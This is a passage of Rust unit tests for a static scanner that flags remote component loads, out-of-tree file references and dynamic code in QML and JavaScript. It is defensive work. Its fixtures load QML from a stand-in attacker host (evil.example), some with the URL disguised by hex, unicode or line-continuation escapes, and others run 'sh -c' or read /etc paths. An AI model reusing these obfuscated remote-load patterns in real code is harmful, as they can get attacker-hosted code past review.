                .all(|finding| finding.rule_id == REMOTE_DIRECTORY_IMPORT_RULE
                    && finding.severity == "low"),
            "{findings:?}"
        );
        assert!(rejection_limitations(&artifacts).is_empty());
    }

    #[test]
    fn local_directory_imports_stay_silent() {
        let source = r#"import QtQuick
import "./widgets" as Widgets
import "widgets"
Item {}
"#;
        let (artifacts, _) = one("L.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn out_of_tree_absolute_and_traversal_loads_are_medium_findings() {
        let source = r#"Item {
    Loader { source: "/tmp/staged.qml" }
    Loader { source: "../outside/W.qml" }
}
"#;
        let (artifacts, _) = one("O.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        assert_eq!(findings.len(), 2, "{findings:?}");
        assert!(
            findings.iter().all(|finding| {
                finding.rule_id == OUT_OF_TREE_REFERENCE_RULE && finding.severity == "medium"
            }),
            "{findings:?}"
        );
        assert!(rejection_limitations(&artifacts).is_empty());
        assert!(
            !rule_ids(&artifacts).contains(&REMOTE_COMPONENT_LOAD_RULE.to_owned()),
            "{ids:?}",
            ids = rule_ids(&artifacts)
        );
    }

    #[test]
    fn qt_include_sinks_split_remote_from_out_of_tree() {
        // Qt.include is a load sink for the Medium out-of-tree rule, but the
        // High remote rule covers only the two H0-verified positions: a
        // remote include surfaces as a typed rejection instead.
        let source = r#"Item {
    Component.onCompleted: {
        Qt.include("/opt/extra.js")
        Qt.include("https://evil.example/extra.js")
        Qt.include("./helper.js")
    }
}
"#;
        let (artifacts, inventory) = run(
            vec![
                entry("I.qml", PayloadKind::Qml, source.len()),
                entry("helper.js", PayloadKind::JavaScript, 16),
            ],
            &[
                ("I.qml", source.as_bytes()),
                ("helper.js", b"// helper\n".repeat(2).as_slice()),
            ],
        );
        let findings = artifacts.rendered_findings();
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == OUT_OF_TREE_REFERENCE_RULE
                    && finding.evidence == "out-of-tree-reference:Qt.include:/opt/extra.js"),
            "{findings:?}"
        );
        assert!(
            !findings
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "Qt.include remote is not the High remote-load rule: {findings:?}"
        );
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0]
                .contains("sink-reference-rejected:remote:I.qml:4:https://evil.example/extra.js")
        );
        // The local relative include still resolves as an invocation edge.
        assert!(
            artifacts
                .edges
                .iter()
                .any(|edge| edge.target_path == "helper.js"),
            "{:?}",
            artifacts.edges
        );
        assert!(inventory.entries[1].invocation_target);
    }

    #[test]
    fn sink_position_rejections_carry_typed_reasons() {
        let source = r#"Item {
    FileView { path: "https://example.test/config" }
    Process { command: ["grim", "-g", "/tmp/shot.png"] }
    Loader { source: "Missing.qml" }
    Loader { source: "qrc:/built-in/Page.qml" }
}
"#;
        let (artifacts, _) = one("S.qml", PayloadKind::Qml, source);
        // Argument and file sinks surface typed rejections, never load-sink
        // findings.
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 4, "{:?}", artifacts.limitations);
        for expected in [
            "sink-reference-rejected:remote:S.qml:2:https://example.test/config",
            "sink-reference-rejected:absolute:S.qml:3:/tmp/shot.png",
            "sink-reference-rejected:missing-local-target:S.qml:4:Missing.qml",
            "sink-reference-rejected:unsupported-scheme:S.qml:5:qrc:/built-in/Page.qml",
        ] {
            assert!(
                rejections.iter().any(|limitation| **limitation == expected),
                "missing {expected} in {rejections:?}"
            );
        }
    }

    #[test]
    fn non_sink_references_stay_inventory_context() {
        // Icon names, format strings, commented URLs, and any unresolvable
        // path-shaped string outside a sink position produce no finding and
        // no limitation (R-2).
        let source = r#"import QtQuick
Item {
    property string icon: "media-playback-start"
    readonly property string labelPattern: "%1/%2.json"
    Text { text: "%1/%2.json" }
    // see https://example.test/spec for details
    Component.onCompleted: console.log(labelPattern.arg(1).arg(2))
}
"#;
        let (artifacts, _) = one("N.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn resolving_sink_references_still_form_edges() {
        let qml = "Item { Loader { source: \"./Panel.qml\" } }\n";
        let (artifacts, inventory) = run(
            vec![
                entry("App.qml", PayloadKind::Qml, qml.len()),
                entry("Panel.qml", PayloadKind::Qml, 10),
            ],
            &[
                ("App.qml", qml.as_bytes()),
                ("Panel.qml", b"Text {}\n".repeat(2).as_slice()),
            ],
        );
        assert!(
            artifacts
                .edges
                .iter()
                .any(|edge| edge.target_path == "Panel.qml"),
            "{:?}",
            artifacts.edges
        );
        assert!(inventory.entries[1].invocation_target);
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn create_component_and_include_join_lexical_dynamic_code() {
        let source = "Qt.createComponent(payload)\nQt.include(module)\n";
        let (artifacts, _) = one("n.js", PayloadKind::JavaScript, source);
        let ids = rule_ids(&artifacts);
        assert_eq!(
            ids.iter().filter(|id| **id == DYNAMIC_CODE_RULE).count(),
            2,
            "{ids:?}"
        );
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "dynamic-code-execution"),
            "{:?}",
            artifacts.capabilities
        );
    }

    #[test]
    fn lexical_lines_carry_sink_rejections_on_standalone_js() {
        // Standalone .js files are always lexical (ADR 0001); a literal
        // createComponent argument outside the tree surfaces its typed
        // rejection there too.
        let source = r#"var component = Qt.createComponent("Missing.qml")
"#;
        let (artifacts, _) = one("view.js", PayloadKind::JavaScript, source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0]
                .contains("sink-reference-rejected:missing-local-target:view.js:1:Missing.qml")
        );
    }

    #[test]
    fn analysis_time_budget_still_bounds_rejection_collection() {
        let source = "Loader { source: \"Missing.qml\" }\n";
        let mut inventory = PayloadInventory {
            entries: vec![entry("A.qml", PayloadKind::Qml, source.len())],
            ..Default::default()
        };
        let expired = TimeBudget::new(std::time::Duration::ZERO);
        let artifacts = analyze_inventory(
            &mut inventory,
            &|_| Some(source.as_bytes().to_vec()),
            &expired,
        );
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "analysis_time_budget_exhausted")
        );
        assert!(rejection_limitations(&artifacts).is_empty());
    }

    // -------------------------------------------------------------------
    // H2 review boundaries: escape decoding, qualified types, centralized
    // scheme parsing, Qt-receiver verification, rejection bounds, and
    // lexical span scoping.
    // -------------------------------------------------------------------

    #[test]
    fn escaped_remote_literal_decodes_to_the_runtime_value() {
        // "\x68ttps://…" evaluates to "https://…" at runtime; the escaped
        // spelling must reach the High rule on both extraction paths.
        let source = "Item { Loader { source: \"\\x68ttps://evil.example/W.qml\" } }\n";
        let (artifacts, _) = one("E.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(remote[0].severity, "high");
        assert_eq!(
            remote[0].evidence,
            "remote-component-load:Loader.source:https://evil.example/W.qml"
        );
    }

    #[test]
    fn unicode_escape_and_doubled_backslash_are_decoded_exactly_once() {
        // \u0068 is 'h': the createComponent literal is a remote URL.
        let source = "Item { Component.onCompleted: Qt.createComponent(\"\\u0068ttps://evil.example/W.qml\") }\n";
        let (artifacts, _) = one("U.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert_eq!(
            remote[0].evidence,
            "remote-component-load:Qt.createComponent:https://evil.example/W.qml"
        );

        // A literal backslash produced by `\\` must not be re-decoded into
        // scheme characters: the runtime value is "\x68ttps://x", not a URL.
        let literal = "Item { Loader { source: \"\\\\\\x68ttps://x\" } }\n";
        let (artifacts, _) = one("B.qml", PayloadKind::Qml, literal);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "{:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn qualified_loader_types_reach_the_sink() {
        let qml = r#"import QtQuick as QQ
Item {
    QQ.Loader { source: "https://evil.example/W.qml" }
    QQ.Loader { source: "./Panel.qml" }
    Io.Process { command: ["sh", "-c", "ls"] }
}
"#;
        let (artifacts, inventory) = run(
            vec![
                entry("Q.qml", PayloadKind::Qml, qml.len()),
                entry("Panel.qml", PayloadKind::Qml, 10),
            ],
            &[
                ("Q.qml", qml.as_bytes()),
                ("Panel.qml", b"Text {}\n".repeat(2).as_slice()),
            ],
        );
        let findings = artifacts.rendered_findings();
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Loader.source:https://"),
            "{}",
            remote[0].evidence
        );
        // The qualified Process type still surfaces its capability and its
        // argv provenance judgment.
        assert!(
            artifacts
                .capabilities
                .iter()
                .any(|capability| capability.capability == "process-execution"),
            "{:?}",
            artifacts.capabilities
        );
        assert!(
            findings
                .iter()
                .any(|finding| finding.rule_id == PROCESS_RULE),
            "{findings:?}"
        );
        // The local qualified Loader reference still resolves as an edge.
        assert!(
            artifacts
                .edges
                .iter()
                .any(|edge| edge.target_path == "Panel.qml"),
            "{:?}",
            artifacts.edges
        );
        assert!(inventory.entries[1].invocation_target);
    }

    #[test]
    fn scheme_parsing_is_case_insensitive_and_file_urls_are_out_of_tree() {
        let source = r#"Item {
    Loader { source: "HTTPS://evil.example/W.qml" }
    Loader { source: "file:///tmp/X.qml" }
    FileView { path: "file:///etc/example.conf" }
}
"#;
        let (artifacts, _) = one("S2.qml", PayloadKind::Qml, source);
        let findings = artifacts.rendered_findings();
        // Uppercase scheme keeps the High remote verdict, with the original
        // spelling preserved in evidence.
        let remote: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{findings:?}");
        assert!(
            remote[0]
                .evidence
                .starts_with("remote-component-load:Loader.source:HTTPS://"),
            "{}",
            remote[0].evidence
        );
        // A file:// URL is a local out-of-tree load, never remote and never
        // a mere unsupported scheme.
        let out_of_tree: Vec<_> = findings
            .iter()
            .filter(|finding| finding.rule_id == OUT_OF_TREE_REFERENCE_RULE)
            .collect();
        assert_eq!(out_of_tree.len(), 1, "{findings:?}");
        assert_eq!(out_of_tree[0].severity, "medium");
        assert!(
            out_of_tree[0]
                .evidence
                .starts_with("out-of-tree-reference:Loader.source:file:///tmp/X.qml"),
            "{}",
            out_of_tree[0].evidence
        );
        // file:// at a non-load sink is a typed rejection with the absolute
        // reason.
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0]
                .contains("sink-reference-rejected:absolute:S2.qml:4:file:///etc/example.conf")
        );
    }

    #[test]
    fn non_qt_receivers_do_not_carry_qt_rules() {
        let source = r#"Item {
    Component.onCompleted: {
        backend.createComponent("https://docs.example/X.qml")
        backend.include("/opt/x.js")
    }
}
"#;
        let (artifacts, _) = one("NQ.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn non_qt_receivers_stay_quiet_on_lexical_paths() {
        let source = r#"backend.createComponent("https://docs.example/X.qml")
backend.include("/opt/x.js")
var component = Qt.createComponent("Missing.qml")
"#;
        let (artifacts, _) = one("nq.js", PayloadKind::JavaScript, source);
        // The user-defined calls stay context; the Qt-global call on line 3
        // still participates.
        assert!(
            rule_ids(&artifacts)
                .iter()
                .all(|id| id == DYNAMIC_CODE_RULE),
            "{:?}",
            rule_ids(&artifacts)
        );
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(rejections[0].contains(":missing-local-target:nq.js:3:Missing.qml"));
    }

    #[test]
    fn sink_rejections_are_capped_and_truncation_is_disclosed() {
        let overflow = 8;
        let count = MAX_SINK_REJECTIONS + overflow;
        let mut source = String::from("Item {\n");
        for index in 0..count {
            source.push_str(&format!(
                "    Loader {{ source: \"Missing{index}.qml\" }}\n"
            ));
        }
        source.push_str("}\n");
        let (artifacts, _) = one("Cap.qml", PayloadKind::Qml, &source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), MAX_SINK_REJECTIONS);
        // The truncation count is the number of omitted OCCURRENCES (H2
        // review); here each of the 8 overflow values occurs exactly once.
        assert!(
            artifacts.limitations.iter().any(|limitation| limitation
                == &format!("sink-reference-rejections-truncated:{overflow}")),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn overflow_counts_occurrences_once_the_unique_set_is_full() {
        // Once the retained set is full, omitted rejections are counted per
        // OCCURRENCE (H2 review): remembering which values were omitted
        // would need unbounded fingerprints under adversarial input. Two
        // occurrences of the same value past the full set count as two.
        let mut source = String::from("Item {\n");
        for index in 0..MAX_SINK_REJECTIONS {
            source.push_str(&format!("    Loader {{ source: \"Fill{index}.qml\" }}\n"));
        }
        source.push_str("    Loader { source: \"Over.qml\" } Loader { source: \"Over.qml\" }\n");
        source.push_str("}\n");
        let (artifacts, _) = one("Occ.js", PayloadKind::JavaScript, &source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), MAX_SINK_REJECTIONS);
        assert!(
            artifacts
                .limitations
                .iter()
                .any(|limitation| limitation == "sink-reference-rejections-truncated:2"),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn duplicate_rejections_do_not_crowd_out_a_later_unique_or_report_truncation() {
        // MAX_SINK_REJECTIONS identical rejections followed by one distinct
        // rejection: the unique one must be retained and no truncation
        // reported, since duplicates carry no new information. The copies must
        // share a line so the rejection strings (which embed the line number)
        // are truly identical.
        let mut source = String::new();
        for _ in 0..MAX_SINK_REJECTIONS {
            source.push_str("Loader { source: \"Dup.qml\" } ");
        }
        source.push_str("Loader { source: \"Unique.qml\" }\n");
        let (artifacts, _) = one("Dupes.js", PayloadKind::JavaScript, &source);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 2, "{:?}", artifacts.limitations);
        assert!(
            rejections.iter().any(|r| r.contains(":Unique.qml")),
            "the later unique rejection must survive: {rejections:?}"
        );
        assert!(
            !artifacts
                .limitations
                .iter()
                .any(|limitation| limitation.starts_with("sink-reference-rejections-truncated:")),
            "duplicate-only overflow must not report truncation: {:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn unrelated_literals_on_a_sink_line_do_not_inherit_the_sink() {
        // Lexical span scoping (H2 review): only the binding/call argument
        // span participates, so a second literal sharing the line stays
        // inventory context even in the no-parser build.
        let source = r#"Loader { source: "Panel.qml"; property string docs: "https://docs.example" }
var command = "themes/legacy/x.json"
"#;
        let (artifacts, _) = one("M.js", PayloadKind::JavaScript, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        // Only "Panel.qml" is a sink-position rejection; the docs URL and
        // the command string never inherit the sink.
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(rejections[0].contains(":missing-local-target:M.js:1:Panel.qml"));
    }

    #[test]
    fn nested_bindings_do_not_inherit_the_outer_loader_sink() {
        // The object brace scope includes nested child objects, so only
        // depth-zero bindings of the matched object may participate (H2
        // review): the nested Image's remote source must not become a
        // Loader.source High finding. `.js` is always lexical.
        let nested = r#"Loader { Image { source: "https://docs.example/logo.qml" } }
"#;
        let (artifacts, _) = one("Nest.js", PayloadKind::JavaScript, nested);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );

        // The complement: a depth-zero binding of the owning object still
        // participates next to a nested child.
        let mixed = r#"Loader { Image { source: "https://docs.example/logo.qml" } source: "Panel.qml" }
"#;
        let (artifacts, _) = one("Nest2.js", PayloadKind::JavaScript, mixed);
        let rejections = rejection_limitations(&artifacts);
        assert_eq!(rejections.len(), 1, "{:?}", artifacts.limitations);
        assert!(
            rejections[0].contains(":missing-local-target:Nest2.js:1:Panel.qml"),
            "{rejections:?}"
        );
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn nested_qml_bindings_do_not_inherit_the_outer_loader_sink_ast() {
        // AST parity: the nested Image is its own object definition and its
        // remote source is not a Loader sink.
        let source = "Item { Loader { Image { source: \"https://docs.example/logo.qml\" } } }\n";
        let (artifacts, _) = one("Nest.qml", PayloadKind::Qml, source);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );
        assert!(
            artifacts.limitations.is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[test]
    fn lexical_dynamic_code_follows_the_qt_receiver_rule() {
        // `backend.Qt.createComponent(...)` is a member named Qt — dynamic
        // code must NOT fire (H2 review); `Qt . createComponent(...)` with
        // whitespace around the dot IS the Qt API and must fire BOTH the
        // dynamic-code finding and the remote-load finding.
        let member = "var c = backend.Qt.createComponent(payload)\n";
        let (artifacts, _) = one("dm.js", PayloadKind::JavaScript, member);
        assert!(
            rule_ids(&artifacts).is_empty(),
            "{:?}",
            rule_ids(&artifacts)
        );

        let spaced = "var c = Qt . createComponent(\"https://evil.example/W.qml\")\n";
        let (artifacts, _) = one("ds.js", PayloadKind::JavaScript, spaced);
        let ids = rule_ids(&artifacts);
        assert!(
            ids.contains(&DYNAMIC_CODE_RULE.to_owned()),
            "spaced Qt.createComponent must carry dynamic code: {ids:?}"
        );
        assert!(
            ids.contains(&REMOTE_COMPONENT_LOAD_RULE.to_owned()),
            "spaced Qt.createComponent must carry the remote-load rule: {ids:?}"
        );
    }

    #[test]
    fn line_continuation_and_legacy_octal_escapes_decode_to_runtime_values() {
        // Backslash + line terminator is a continuation: it evaluates to the
        // empty string, so `"ht\<LF>tps://…"` is `https://…` at runtime.
        assert_eq!(decode_js_escapes("ht\\\ntps://x"), "https://x");
        assert_eq!(decode_js_escapes("a\\\r\nb"), "ab"); // CRLF is one sequence
        assert_eq!(decode_js_escapes("a\\\rb"), "ab"); // lone CR
        assert_eq!(decode_js_escapes("a\\\u{2028}b"), "ab"); // line separator
        assert_eq!(decode_js_escapes("a\\\u{2029}b"), "ab"); // paragraph separator
        // Legacy octal escapes (Annex B): value is the octal number.
        assert_eq!(decode_js_escapes("\\101"), "A"); // \101 == 'A'
        assert_eq!(decode_js_escapes("\\1"), "\u{0001}"); // single octal digit
        assert_eq!(decode_js_escapes("\\0"), "\0"); // NUL
        assert_eq!(decode_js_escapes("\\478"), "'8"); // 4-7 caps at two digits: \47='\'' then '8'
    }

    #[test]
    fn line_continuation_in_a_load_sink_still_reaches_the_high_rule() {
        // A continuation splits an https URL across the escape; the decoded
        // runtime value is a remote load and must not slip past the rule. The
        // AST build parses the multi-line string as one literal.
        #[cfg(feature = "qml-parser")]
        {
            let source = "Item { Loader { source: \"ht\\\ntps://evil.example/W.qml\" } }\n";
            let (artifacts, _) = one("LC.qml", PayloadKind::Qml, source);
            let remote: Vec<_> = artifacts
                .rendered_findings()
                .into_iter()
                .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
                .collect();
            assert_eq!(remote.len(), 1, "{:?}", artifacts.rendered_findings());
            assert_eq!(
                remote[0].evidence,
                "remote-component-load:Loader.source:https://evil.example/W.qml"
            );
        }
    }

    #[cfg(feature = "qml-parser")]
    #[test]
    fn parenthesized_qt_receiver_still_reaches_the_sink() {
        // `(Qt).createComponent(...)` is the same Qt-global call; the
        // parenthesized receiver must be unwrapped before the receiver check.
        let source = "Item { Component.onCompleted: (Qt).createComponent(\"https://evil.example/W.qml\") }\n";
        let (artifacts, _) = one("PQ.qml", PayloadKind::Qml, source);
        let remote: Vec<_> = artifacts
            .rendered_findings()
            .into_iter()
            .filter(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE)
            .collect();
        assert_eq!(remote.len(), 1, "{:?}", artifacts.rendered_findings());
    }

    #[test]
    fn lexical_qt_matching_is_receiver_exact() {
        // A member named Qt (`backend.Qt.createComponent`) is NOT the Qt
        // global and must not produce a High finding. `.js` is always lexical.
        let miss = "var c = backend.Qt.createComponent(\"https://docs.example/X.qml\")\n";
        let (artifacts, _) = one("miss.js", PayloadKind::JavaScript, miss);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "member Qt must not match: {:?}",
            artifacts.rendered_findings()
        );

        // Whitespace around the dot is still the Qt global: High.
        let hit = "var c = Qt . createComponent(\"https://evil.example/W.qml\")\n";
        let (artifacts, _) = one("hit.js", PayloadKind::JavaScript, hit);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "spaced Qt.createComponent must match: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[test]
    fn lexical_qt_sink_marks_only_the_first_argument() {
        // Only the first argument of createComponent is the loaded URL; a URL
        // in a later argument must not become a High finding.
        let source = "var c = Qt.createComponent(mode, \"https://evil.example/W.qml\")\n";
        let (artifacts, _) = one("arg.js", PayloadKind::JavaScript, source);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "second-argument URL must not be marked: {:?}",
            artifacts.rendered_findings()
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn lexical_binding_is_scoped_to_the_objects_braces() {
        // `Image.source` must not be attributed to the adjacent `Loader`:
        // the binding is scoped to the matching object's brace span, not the
        // shared line, so no false High finding in the lexical build.
        let source = "Loader {} Image { source: \"https://docs.example/logo.qml\" }\n";
        let (artifacts, _) = one("BS.qml", PayloadKind::Qml, source);
        assert!(
            !artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "Image.source is not Loader.source: {:?}",
            artifacts.rendered_findings()
        );
        // And it is not even recorded as a Loader sink rejection.
        assert!(
            rejection_limitations(&artifacts).is_empty(),
            "{:?}",
            artifacts.limitations
        );
    }

    #[cfg(not(feature = "qml-parser"))]
    #[test]
    fn lexical_scoped_binding_still_finds_the_owning_objects_sink() {
        // The complement of the scoping fix: a same-line Loader with its own
        // remote source is still a High finding.
        let source = "Row { Loader { source: \"https://evil.example/W.qml\" } }\n";
        let (artifacts, _) = one("BS2.qml", PayloadKind::Qml, source);
        assert!(
            artifacts
                .rendered_findings()
                .iter()
                .any(|finding| finding.rule_id == REMOTE_COMPONENT_LOAD_RULE),
            "the owning Loader's remote source must still fire: {:?}",
            artifacts.rendered_findings()
        );
    }
}
